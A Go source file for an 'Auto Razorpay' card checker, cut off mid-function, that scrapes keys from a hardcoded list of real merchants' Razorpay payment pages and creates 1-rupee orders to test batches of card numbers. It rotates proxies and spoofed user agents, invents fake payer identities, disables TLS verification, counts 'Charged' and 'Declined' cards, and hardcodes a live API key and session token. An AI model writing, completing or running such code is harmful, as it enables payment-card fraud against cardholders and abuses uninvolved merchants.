// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

package main

import (
    "crypto/rand"
    "crypto/sha1"
    "crypto/tls"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    "io"
    "log"
    "math/big"
    "net/http"
    "net/http/cookiejar"
    "net/url"
    "os"
    "regexp"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

const (
    BUILD    = "0a06da4367ab84356ed4412f69d70dffd3829d9b"
    BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"
    PORT     = 7070
)

// Get port from environment or use default
func getPort() int {
    if p := os.Getenv("RZP_PORT"); p != "" {
        if port, err := strconv.Atoi(p); err == nil && port > 0 && port < 65536 {
            return port
        }
    }
    return PORT
}

// ──────────────────────────────────────────────────────────────────────────────
//  API CONFIGURATION (from x64kbitters script)
// ──────────────────────────────────────────────────────────────────────────────

// Hardcoded API credentials from x64kbitters script
const (
    // Session token from x64kbitters
    RZP_SESSION_TOKEN = "B00EC195C8A1A5509FF105D4840A299626B18E2F71D22165981A5265F5512CF2A0431640385AE22F4E3940E22C83B1ED766BAFEDBF45CE2172AF62DB8F9AFB6FD02428878357228743CB005F4AF6E92887EF53A9F7008754289E37026428E1C5C9D293E37B300159"
    // Key ID from x64kbitters
    RZP_KEY_ID = "rzp_live_T1qlctbJRtHxhL"
    // Keyless header from x64kbitters
    RZP_KEYLESS_HEADER = "api_v1%3AwaVXKuSoQNd3q0C8gnJNo%2BFQQAGuoxXg34FNrVQRiStweDR61DHPRH%2BDmLSCv7zj23Nn7Tpg2qQjxK%2FELdgkmRNfTrgAJw%3D%3D"
    // Default VPA from x64kbitters
    RZP_DEFAULT_VPA = "9023510377"
    // Payment page ID from x64kbitters
    RZP_PAYMENT_PAGE = "pl_OqYzfw0fykO01F"
    // Payment page item ID from x64kbitters
    RZP_PAYMENT_PAGE_ITEM = "ppi_OqYzfxzDW3KJxZ"
    // Shield fhash from x64kbitters
    RZP_SHIELD_FHASH = "d9a51addd9d0247b1aaf8457e2d4359cfe706632"
    // Fingerprint from x64kbitters
    RZP_FINGERPRINT = "df3b0f0879e7309fd1df2d4902f088a3b064ce9a048fe8de7a54ce03512f9fa5"
    // Amount in paise (100 = ₹1)
    RZP_AMOUNT = 100
)

// Session token from environment or use default from x64kbitters script
func getSessionToken() string {
    if token := os.Getenv("RZP_SESSION_TOKEN"); token != "" {
        return token
    }
    return RZP_SESSION_TOKEN
}

// Key ID from environment or use default
func getKeyID() string {
    if keyID := os.Getenv("RZP_KEY_ID"); keyID != "" {
        return keyID
    }
    return RZP_KEY_ID
}

// Keyless header from environment or use default
func getKeylessHeader() string {
    if kh := os.Getenv("RZP_KEYLESS_HEADER"); kh != "" {
        return kh
    }
    return RZP_KEYLESS_HEADER
}

// Get payment page ID
func getPaymentPageID() string {
    if id := os.Getenv("RZP_PAYMENT_PAGE"); id != "" {
        return id
    }
    return RZP_PAYMENT_PAGE
}

// ──────────────────────────────────────────────────────────────────────────────
//  DYNAMIC URL SELECTION
// ──────────────────────────────────────────────────────────────────────────────

// getMerchantURL returns the merchant URL to use
func getMerchantURL() string {
    // Check environment for specific merchant
    if merchant := os.Getenv("RZP_MERCHANT"); merchant != "" {
        return "https://razorpay.me/@" + merchant
    }
    // Check for specific URL
    if url := os.Getenv("RZP_URL"); url != "" {
        return url
    }
    // Use dynamic rotation
    return getNextURL()
}

// getAllMerchantURLs returns all available merchant URLs
func getAllMerchantURLs() []string {
    return razorpayURLs
}

// getMerchantCount returns number of available merchants
func getMerchantCount() int {
    return len(razorpayURLs)
}

// Get payment page item ID
func getPaymentPageItemID() string {
    if id := os.Getenv("RZP_PAYMENT_PAGE_ITEM"); id != "" {
        return id
    }
    return RZP_PAYMENT_PAGE_ITEM
}

// Get shield fhash
func getShieldFhash() string {
    if fh := os.Getenv("RZP_SHIELD_FHASH"); fh != "" {
        return fh
    }
    return RZP_SHIELD_FHASH
}

// Get fingerprint cookie
func getFingerprint() string {
    if fp := os.Getenv("RZP_FINGERPRINT"); fp != "" {
        return fp
    }
    return RZP_FINGERPRINT
}

// Get amount in paise
func getAmount() int {
    if amt := os.Getenv("RZP_AMOUNT"); amt != "" {
        if a, err := strconv.Atoi(amt); err == nil && a > 0 {
            return a
        }
    }
    return RZP_AMOUNT
}

var (
    // Dynamic merchant URLs - will fetch credentials from these pages
    razorpayURLs = []string{
        // Top performing merchants
        "https://razorpay.me/@mstechnomedia",
        "https://razorpay.me/@zexaera",
        "https://razorpay.me/@hotelparasinternationaldelhi",
        "https://razorpay.me/@bhakthamrutham",
        "https://razorpay.me/@rudrakshakailash",
        "https://razorpay.me/@mahogany",
        "https://razorpay.me/@bharatkaaitech",
        "https://razorpay.me/@nitizsharmaglobaltech",
        "https://razorpay.me/@vibhutistudios",
        "https://razorpay.me/@RolexPutin",
        "https://razorpay.me/@astapackomax",
        "https://razorpay.me/@ISHATITHYA",
        "https://razorpay.me/@corediagnostics",
        "https://razorpay.me/@carotid",
        "https://razorpay.me/@techsolutionshyd",
        "https://razorpay.me/@sairamtravels",
        "https://razorpay.me/@kaverienterprises",
        "https://razorpay.me/@globaltechservices",
        "https://razorpay.me/@smartpayindia",
        "https://razorpay.me/@easycheckout",
    }
    urlIndex   uint64
    proxyIndex uint64
    // Track failed URLs to avoid
    failedURLs map[string]bool
)

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

// initFailedURLs initializes the failed URLs map
func initFailedURLs() {
    failedURLs = make(map[string]bool)
}

// markURLFailed marks a URL as failed so we skip it
func markURLFailed(url string) {
    failedURLs[url] = true
    log.Printf("[URL] Marked as failed: %s", url)
}

// isURLFailed checks if a URL has failed
func isURLFailed(url string) bool {
    return failedURLs[url]
}

// getNextURL returns next working URL (skipping failed ones)
func getNextURL() string {
    // Try up to len(URLs) times to find a working one
    for i := uint64(0); i < uint64(len(razorpayURLs)); i++ {
        idx := atomic.AddUint64(&urlIndex, 1) - 1
        url := razorpayURLs[idx%uint64(len(razorpayURLs))]

        // Skip if marked as failed
        if isURLFailed(url) {
            continue
        }

        log.Printf("[URL] Using: %s", url)
        return url
    }

    // If all failed, reset and try again
    initFailedURLs()
    idx := atomic.AddUint64(&urlIndex, 1) - 1
    return razorpayURLs[idx%uint64(len(razorpayURLs))]
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func formatProxy(raw string) string {
    raw = strings.TrimSpace(raw)
    if raw == "" {
        return ""
    }
    if strings.Contains(raw, "://") {
        return raw
    }
    parts := strings.Split(raw, ":")
    if len(parts) == 4 {
        return fmt.Sprintf("http://%s:%s@%s:%s", url.QueryEscape(parts[2]), url.QueryEscape(parts[3]), parts[0], parts[1])
    }
    return "http://" + raw
}

func loadProxies(filepath string) []string {
    var proxies []string
    data, err := os.ReadFile(filepath)
    if err != nil {
        return proxies
    }
    lines := strings.Split(string(data), "\n")
    for _, line := range lines {
        line = strings.TrimSpace(line)
        // Skip empty lines and comments
        if line == "" || strings.HasPrefix(line, "#") {
            continue
        }
        formatted := formatProxy(line)
        if formatted != "" {
            proxies = append(proxies, formatted)
        }
    }
    return proxies
}

func getNextProxy(proxyList []string) string {
    if len(proxyList) == 0 {
        return ""
    }
    idx := atomic.AddUint64(&proxyIndex, 1) - 1
    return proxyList[idx%uint64(len(proxyList))]
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func randInt(min, max int) int {
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
    return int(n.Int64()) + min
}

func genUA() string {
    major := randInt(120, 147)
    build := randInt(5000, 6999)
    patch := randInt(50, 249)
    return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", major, build, patch)
}

func genIndianPhone() string {
    first := []string{"6", "7", "8", "9"}[randInt(0, 3)]
    rest := ""
    for i := 0; i < 9; i++ {
        rest += strconv.Itoa(randInt(0, 9))
    }
    return "+91" + first + rest
}

func genEmail() string {
    names := []string{"alex", "john", "mike", "sara", "david", "emma", "james", "lisa", "chris", "anna", "rahul", "priya", "amit", "neha", "vikram"}
    return names[randInt(0, len(names)-1)] + strconv.Itoa(randInt(100, 9999)) + "@gmail.com"
}

func genName() string {
    firstNames := []string{"Alex", "John", "Mike", "Sara", "David", "Emma", "James", "Lisa", "Chris", "Anna", "Rahul", "Priya", "Amit", "Neha", "Vikram"}
    lastNames := []string{"Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Martinez", "Wilson"}
    return firstNames[randInt(0, len(firstNames)-1)] + " " + lastNames[randInt(0, len(lastNames)-1)]
}

func getBrand(cc string) string {
    if strings.HasPrefix(cc, "4") {
        return "visa"
    }
    if len(cc) >= 2 {
        switch cc[:2] {
        case "51", "52", "53", "54", "55":
            return "mastercard"
        case "34", "37":
            return "amex"
        }
    }
    if strings.HasPrefix(cc, "6011") || strings.HasPrefix(cc, "65") {
        return "discover"
    }
    return "unknown"
}

func findBetween(content, start, end string) string {
    si := strings.Index(content, start)
    if si == -1 {
        return ""
    }
    si += len(start)
    ei := strings.Index(content[si:], end)
    if ei == -1 {
        return ""
    }
    return content[si : si+ei]
}

// extractJSONVar uses brace counting instead of regex — Go's RE2 does NOT
// backtrack like PHP's PCRE, so `[\s\S]*?` stops at the first `}` (which is
// inside a nested object), producing truncated/corrupt JSON.
func extractJSONVar(content, varName string) string {
    prefix := "var " + varName + " ="
    startIdx := strings.Index(content, prefix)
    if startIdx == -1 {
        return ""
    }
    startIdx += len(prefix)

    // skip whitespace
    for startIdx < len(content) {
        c := content[startIdx]
        if c != ' ' && c != '\t' && c != '\n' && c != '\r' {
            break
        }
        startIdx++
    }

    if startIdx >= len(content) || content[startIdx] != '{' {
        return ""
    }

    depth := 0
    inString := false
    escaped := false

    for i := startIdx; i < len(content); i++ {
        c := content[i]

        if escaped {
            escaped = false
            continue
        }
        if c == '\\' && inString {
            escaped = true
            continue
        }
        if c == '"' {
            inString = !inString
            continue
        }
        if inString {
            continue
        }
        if c == '{' {
            depth++
        } else if c == '}' {
            depth--
            if depth == 0 {
                return content[startIdx : i+1]
            }
        }
    }
    return ""
}

func generateRzpDeviceID() (string, string) {
    buf := make([]byte, 16)
    rand.Read(buf)
    h := sha1.Sum(buf)
    hStr := hex.EncodeToString(h[:])
    ts := strconv.FormatInt(time.Now().UnixMilli(), 10)
    rnd := fmt.Sprintf("%08d", randInt(0, 99999999))
    return fmt.Sprintf("1.%s.%s.%s", hStr, ts, rnd), hStr
}

func generateRzpSessionID() string {
    const base62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    buf := make([]byte, 14)
    for i := 0; i < 14; i++ {
        n, _ := rand.Int(rand.Reader, big.NewInt(62))
        buf[i] = base62[n.Int64()]
    }
    return string(buf)
}

// ──────────────────────────────────────────────────────────────────────────────
//  VPA FUNCTIONS (from x64kbitters script)
// ──────────────────────────────────────────────────────────────────────────────

// Configurable VPA - can be set via environment variable or use default
var configuredVPA = getConfiguredVPA()

func getConfiguredVPA() string {
    // Check environment variable first
    if vpa := os.Getenv("RZP_VPA"); vpa != "" {
        return vpa
    }
    // Dynamic phone from environment or generate
    if phone := os.Getenv("RZP_PHONE"); phone != "" {
        return phone
    }
    // Default VPA from x64kbitters script
    return "9023510377"
}

func genVPA() string {
    // Generate a random valid Indian UPI VPA
    // Format: 10-digit-number@upi  OR 10-digit-number@ybl
    firstDigit := []string{"6", "7", "8", "9"}[randInt(0, 3)]
    rest := ""
    for i := 0; i < 9; i++ {
        rest += strconv.Itoa(randInt(0, 9))
    }
    // Use either @upi or @ybl
    handle := firstDigit + rest
    handlers := []string{"upi", "ybl", "axl", "okhdfcbank", "sbi"}
    return handle + "@" + handlers[randInt(0, len(handlers)-1)]
}

// ──────────────────────────────────────────────────────────────────────────────
//  DYNAMIC CREDENTIALS FETCHING
// ──────────────────────────────────────────────────────────────────────────────

// RazorpayCredentials holds credentials fetched from page
type RazorpayCredentials struct {
    KeyID           string
    KeylessHeader    string
    PaymentPageID   string
    PaymentItemID   string
    Amount         int
    Currency       string
}

// fetchCredentialsFromPage fetches API credentials from a Razorpay page
func fetchCredentialsFromPage(fetch *CustomFetch, pageURL string) (*RazorpayCredentials, error) {
    // Get the page
    resp, err := fetch.Get(pageURL, map[string]string{
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    })
    if err != nil {
        return nil, fmt.Errorf("failed to fetch page: %w", err)
    }

    pageHTML := resp.Text()

    // Extract JSON data from page
    jsonStr := extractJSONVar(pageHTML, "data")
    if jsonStr == "" {
        return nil, errors.New("no data variable found in page")
    }

    var pageData map[string]interface{}
    if err := json.Unmarshal([]byte(jsonStr), &pageData); err != nil {
        // Try parsing inner string
        var inner string
        if err2 := json.Unmarshal([]byte(jsonStr), &inner); err2 == nil {
            if err3 := json.Unmarshal([]byte(inner), &pageData); err3 != nil {
                return nil, fmt.Errorf("failed to parse page data: %w", err3)
            }
        } else {
            return nil, fmt.Errorf("failed to parse page data: %w", err)
        }
    }

    creds := &RazorpayCredentials{
        Amount:   100, // Default 1 INR
        Currency: "INR",
    }

    // Extract key_id
    creds.KeyID = getStringFromMap(pageData, "key_id")
    if creds.KeyID == "" {
        creds.KeyID = getStringFromMap(pageData, "key")
    }

    // Extract keyless_header
    creds.KeylessHeader = getStringFromMap(pageData, "keyless_header")

    // Extract payment_link or payment_page
    if plObj, ok := pageData["payment_link"].(map[string]interface{}); ok {
        creds.PaymentPageID = getStringFromMap(plObj, "id")
        if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
            if item, ok3 := items[0].(map[string]interface{}); ok3 {
                creds.PaymentItemID = getStringFromMap(item, "id")
            }
        }
    } else if ppObj, ok := pageData["payment_page"].(map[string]interface{}); ok {
        creds.PaymentPageID = getStringFromMap(ppObj, "id")
        if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
            if item, ok3 := items[0].(map[string]interface{}); ok3 {
                creds.PaymentItemID = getStringFromMap(item, "id")
            }
        }
    }

    // Extract amount if available
    if plObj, ok := pageData["payment_link"].(map[string]interface{}); ok {
        if amount, ok := plObj["amount"].(float64); ok {
            creds.Amount = int(amount)
        }
    }

    log.Printf("[CRED] KeyID: %s, PageID: %s, ItemID: %s", creds.KeyID, creds.PaymentPageID, creds.PaymentItemID)

    return creds, nil
}

// DynamicCredentials stores fetched credentials with auto-refresh
var (
    cachedCreds    *RazorpayCredentials
    credsMux     sync.RWMutex
    lastCredsURL string
)

func getDynamicCredentials(fetch *CustomFetch, pageURL string) (*RazorpayCredentials, error) {
    credsMux.RLock()
    // Use cached if same URL and recent
    if cachedCreds != nil && lastCredsURL == pageURL && time.Since(lastFetchTime) < 5*time.Minute {
        credsMux.RUnlock()
        return cachedCreds, nil
    }
    credsMux.RUnlock()

    // Fetch fresh credentials
    newCreds, err := fetchCredentialsFromPage(fetch, pageURL)
    if err != nil {
        return nil, err
    }

    // Cache it
    credsMux.Lock()
    cachedCreds = newCreds
    lastCredsURL = pageURL
    lastFetchTime = time.Now()
    credsMux.Unlock()

    return newCreds, nil
}

var (
    lastFetchTime time.Time
)

// refreshCredentials forces a refresh of cached credentials
func refreshCredentials() {
    credsMux.Lock()
    cachedCreds = nil
    lastCredsURL = ""
    credsMux.Unlock()
}

// ──────────────────────────────────────────────────────────────────────────────
//  LIVE STATISTICS TRACKING (from x64kbitters script)
// ──────────────────────────────────────────────────────────────────────────────

type LiveStats struct {
    totalCards  uint64
    processed  uint64
    liveCount  uint64
    declined  uint64
    threeds    uint64
    unknown   uint64
    invalid   uint64
}

var stats LiveStats

func resetStats() {
    atomic.StoreUint64(&stats.totalCards, 0)
    atomic.StoreUint64(&stats.processed, 0)
    atomic.StoreUint64(&stats.liveCount, 0)
    atomic.StoreUint64(&stats.declined, 0)
    atomic.StoreUint64(&stats.threeds, 0)
    atomic.StoreUint64(&stats.unknown, 0)
    atomic.StoreUint64(&stats.invalid, 0)
}

func showLiveStats() string {
    total := atomic.LoadUint64(&stats.totalCards)
    processed := atomic.LoadUint64(&stats.processed)
    live := atomic.LoadUint64(&stats.liveCount)
    declined := atomic.LoadUint64(&stats.declined)
    threeds := atomic.LoadUint64(&stats.threeds)
    unknown := atomic.LoadUint64(&stats.unknown)
    invalid := atomic.LoadUint64(&stats.invalid)

    return fmt.Sprintf(`
┌─────────────────────────────────────────────────────────────┐
│ 📊 LIVE STATISTICS
├─────────────────────────────────────────────────────────────┤
│ Total Cards: %d
│ Processed: %d/%d
│ ✅ Charged: %d
│ ❌ Declined: %d
│ 🔒 3DS Required: %d
│ ⚠️ Unknown: %d
│ 🚫 Invalid: %d
└─────────────────────────────────────────────────────────────┘`, total, processed, total, live, declined, threeds, unknown, invalid)
}

func incLive() {
    atomic.AddUint64(&stats.liveCount, 1)
    atomic.AddUint64(&stats.processed, 1)
}

func incDeclined() {
    atomic.AddUint64(&stats.declined, 1)
    atomic.AddUint64(&stats.processed, 1)
}

func incThreeds() {
    atomic.AddUint64(&stats.threeds, 1)
    atomic.AddUint64(&stats.processed, 1)
}

func incUnknown() {
    atomic.AddUint64(&stats.unknown, 1)
    atomic.AddUint64(&stats.processed, 1)
}

func incInvalid() {
    atomic.AddUint64(&stats.invalid, 1)
    atomic.AddUint64(&stats.processed, 1)
}

func setTotalCards(n uint64) {
    atomic.StoreUint64(&stats.totalCards, n)
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

type FetchResponse struct {
    Body       string
    StatusCode int
    Headers    http.Header
}

func (r *FetchResponse) Text() string {
    return r.Body
}

func (r *FetchResponse) JSON() (map[string]interface{}, error) {
    var result map[string]interface{}
    err := json.Unmarshal([]byte(r.Body), &result)
    return result, err
}

type CustomFetch struct {
    client *http.Client
    ua     string
}

func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
    jar, err := cookiejar.New(nil)
    if err != nil {
        return nil, err
    }

    transport := &http.Transport{
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
            ServerName:       "api.razorpay.com",
        },
        MaxIdleConns:        15,
        IdleConnTimeout:   45 * time.Second,
        DisableCompression: false,
        DisableKeepAlives:   false,
        MaxIdleConnsPerHost: 10,
        ExpectContinueTimeout: 5 * time.Second,
    }

    if proxyURL != "" {
        parsed, err := url.Parse(proxyURL)
        if err != nil {
            return nil, fmt.Errorf("invalid proxy url: %w", err)
        }
        transport.Proxy = http.ProxyURL(parsed)
    }

    client := &http.Client{
        Transport: transport,
        Jar:       jar,
        Timeout:   45 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if len(via) >= 10 {
                return errors.New("too many redirects")
            }
            return nil
        },
    }

    if ua == "" {
        ua = genUA()
    }

    return &CustomFetch{client: client, ua: ua}, nil
}

func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
    var reqBody io.Reader = body
    if reqBody == nil && method == "POST" {
        reqBody = strings.NewReader("")
    }

    req, err := http.NewRequest(method, targetURL, reqBody)
    if err != nil {
        return nil, err
    }

    if _, ok := headers["User-Agent"]; !ok {
        req.Header.Set("User-Agent", f.ua)
    }
    for k, v := range headers {
        req.Header.Set(k, v)
    }

    resp, err := f.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    respBody, err := io.ReadAll(resp.Body)
    if err != nil {
        return nil, err
    }

    return &FetchResponse{
        Body:       string(respBody),
        StatusCode: resp.StatusCode,
        Headers:    resp.Header,
    }, nil
}

func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
    return f.DoFetch(targetURL, "GET", headers, nil)
}

func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
    jsonBytes, err := json.Marshal(payload)
    if err != nil {
        return nil, err
    }
    if headers == nil {
        headers = make(map[string]string)
    }
    if _, ok := headers["Content-Type"]; !ok {
        if _, ok2 := headers["Content-type"]; !ok2 {
            if _, ok3 := headers["content-type"]; !ok3 {
                headers["Content-Type"] = "application/json"
            }
        }
    }
    return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
}

func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
    if headers == nil {
        headers = make(map[string]string)
    }
    if _, ok := headers["Content-Type"]; !ok {
        if _, ok2 := headers["Content-type"]; !ok2 {
            if _, ok3 := headers["content-type"]; !ok3 {
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            }
        }
    }
    return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

type CheckResult struct {
    Status      string `json:"status"`
    Message     string `json:"response"`
    Proxy       string `json:"proxy"`
    ProxyStatus string `json:"proxy_status"`
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
    yy2 := yy
    if len(yy) == 4 {
        yy2 = yy[2:]
    }
    year, _ := strconv.Atoi("20" + yy2)
    brand := getBrand(cc)
    ua := genUA()
    phone := genIndianPhone()
    phoneShort := phone[3:]
    email := genEmail()
    nameOnCard := genName()

    rzpDeviceID, fhash := generateRzpDeviceID()
    rzpSessionID := generateRzpSessionID()

    fetch, err := NewCustomFetch(proxyURL, ua)
    if err != nil {
        return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
    }
    defer fetch.client.CloseIdleConnections()

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

    r1, err := fetch.Get(targetURL, map[string]string{
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    })
    if err != nil {
        return makeProxyError(err, proxyURL)
    }
    r1Text := r1.Text()

    // Use brace-counting parser instead of regex
    jsonStr := extractJSONVar(r1Text, "data")
    if jsonStr == "" {
        return CheckResult{Status: "error", Message: "Failed to locate Razorpay data on page", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    var initData map[string]interface{}
    if err := json.Unmarshal([]byte(jsonStr), &initData); err != nil {
        var inner string
        if err2 := json.Unmarshal([]byte(jsonStr), &inner); err2 == nil {
            if err3 := json.Unmarshal([]byte(inner), &initData); err3 != nil {
                return CheckResult{Status: "error", Message: "Failed to parse Razorpay JSON data", Proxy: proxyURL, ProxyStatus: "LIVE"}
            }
        } else {
            return CheckResult{Status: "error", Message: "Failed to parse Razorpay JSON data: " + truncate(err.Error(), 80), Proxy: proxyURL, ProxyStatus: "LIVE"}
        }
    }

    kyid := getStringFromMap(initData, "key_id")
    if kyid == "" {
        kyid = getStringFromMap(initData, "key")
    }
    if kyid == "" {
        return CheckResult{Status: "error", Message: "Razorpay Key ID not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    var plink, ppid string
    // Force 1 INR (100 paise) — never use 0 from potentially missing JSON fields
    const forceAmount float64 = 100

    if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
        plink = getStringFromMap(plObj, "id")
        if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
            if item, ok3 := items[0].(map[string]interface{}); ok3 {
                ppid = getStringFromMap(item, "id")
            }
        }
    } else if ppObj, ok := initData["payment_page"].(map[string]interface{}); ok {
        plink = getStringFromMap(ppObj, "id")
        if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
            if item, ok3 := items[0].(map[string]interface{}); ok3 {
                ppid = getStringFromMap(item, "id")
            }
        }
    }

    if plink == "" {
        return CheckResult{Status: "error", Message: "Payment Link ID not found in page structure", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    keylessHeader := getStringFromMap(initData, "keyless_header")
    keylessHeaderURL := url.QueryEscape(keylessHeader)

// ──────────────────────────────────────────────────────────────────────────────
//  ULTRA BEST FLOW - Multiple endpoints + Retries
// ──────────────────────────────────────────────────────────────────────────────

    // Try multiple order creation endpoints
    orderID := ""
    var lastOrderError string
    orderEndpoints := []string{
        fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", plink),
        fmt.Sprintf("https://api.razorpay.com/v1/payment_links/%s/order", plink),
    }
    
    for _, orderEndpoint := range orderEndpoints {
        r2Payload := map[string]interface{}{
            "notes":        map[string]string{"comment": "", "name": nameOnCard},
            "line_items":   []map[string]interface{}{{"payment_page_item_id": ppid, "amount": forceAmount}},
        }
        
        r2, err := fetch.PostJSON(
            orderEndpoint,
            map[string]string{
                "Accept":       "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Origin":       "https://pages.razorpay.com",
                "Referer":      "https://pages.razorpay.com/",
            },
            r2Payload,
        )
        if err == nil {
            var r2Data map[string]interface{}
            if json.Unmarshal([]byte(r2.Text()), &r2Data) == nil {
                if orderObj, ok := r2Data["order"].(map[string]interface{}); ok {
                    orderID = getStringFromMap(orderObj, "id")
                    if orderID != "" {
                        break // Success
                    }
                }
                // Track error
                if e, ok := r2Data["error"].(map[string]interface{}); ok {
                    lastOrderError = getStringFromMap(e, "description")
                    if lastOrderError == "" {
                        lastOrderError = getStringFromMap(e, "reason")
                    }
                }
            }
        }
    }
    
    if orderID == "" {
        // Last try - fallback with different payload
        r2Payload := map[string]interface{}{
            "amount":   forceAmount,
            "currency": "INR",
            "notes":    map[string]string{"comment": "", "name": nameOnCard},
        }
        
        r2, err := fetch.PostJSON(
            fmt.Sprintf("https://api.razorpay.com/v1/payment_links/%s/order", plink),
            map[string]string{
                "Accept":       "application/json, text/plain, */*",
                "Content-Type": "application/json",
            },
            r2Payload,
        )
        if err == nil {
            var r2Data map[string]interface{}
            if json.Unmarshal([]byte(r2.Text()), &r2Data) == nil {
                if orderObj, ok := r2Data["order"].(map[string]interface{}); ok {
                    orderID = getStringFromMap(orderObj, "id")
                }
                if lastOrderError == "" {
                    if e, ok := r2Data["error"].(map[string]interface{}); ok {
                        lastOrderError = getStringFromMap(e, "description")
                    }
                }
            }
        }
    }
    
    // Track last error for reporting
    if orderID == "" {
        errMsg := "Order creation failed (all endpoints)"
        if lastOrderError != "" {
            errMsg = lastOrderError
        }
        return CheckResult{Status: "error", Message: errMsg, Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    checkoutID := orderID
    if idx := strings.Index(orderID, "_"); idx != -1 {
        checkoutID = orderID[idx+1:]
    }

    // Set defaults since we may not have the full order object
    orderAmount := forceAmount
    orderCurrency := "INR"
    
    // Try to get order details if available
    tryEndpoints := []string{
        fmt.Sprintf("https://api.razorpay.com/v1/orders/%s", orderID),
        fmt.Sprintf("https://api.razorpay.com/v1/payment_links/%s", plink),
    }
    for _, detailURL := range tryEndpoints {
        rDetail, err := fetch.Get(detailURL, map[string]string{"Accept": "application/json"})
        if err == nil {
            var detailData map[string]interface{}
            if json.Unmarshal([]byte(rDetail.Text()), &detailData) == nil {
                if ord, ok := detailData["order"].(map[string]interface{}); ok {
                    orderAmount = getFloatFromMap(ord, "amount")
                    if orderAmount > 0 {
                        orderCurrency = getStringFromMap(ord, "currency")
                        break
                    }
                }
            }
        }
    }
    
    if orderAmount < 100 {
        orderAmount = forceAmount
    }
    if orderCurrency == "" {
        orderCurrency = "INR"
    }

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

    params3 := url.Values{
        "traffic_env":        {"production"},
        "build":              {BUILD},
        "build_v1":           {BUILD_V1},
        "checkout_v2":        {"1"},
        "new_session":        {"1"},
        "keyless_header":     {keylessHeader},
        "rzp_device_id":      {rzpDeviceID},
        "unified_session_id": {rzpSessionID},
    }

    r3, err := fetch.Get(
        "https://api.razorpay.com/v1/checkout/public?"+params3.Encode(),
        map[string]string{
            "Accept":  "text/html,application/xhtml+xml,*/*",
            "Referer": "https://pages.razorpay.com/",
        },
    )
    if err != nil {
        return makeProxyError(err, proxyURL)
    }
    r3Text := r3.Text()

    sessid := findBetween(r3Text, `window.session_token="`, `";`)
    if sessid == "" {
        re := regexp.MustCompile(`session_token['"]?\s*[:=]\s*['"]([A-F0-9]{40,})['"]`)
        m := re.FindStringSubmatch(r3Text)
        if len(m) >= 2 {
            sessid = m[1]
        }
    }
    if sessid == "" {
        return CheckResult{Status: "error", Message: "Session token not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

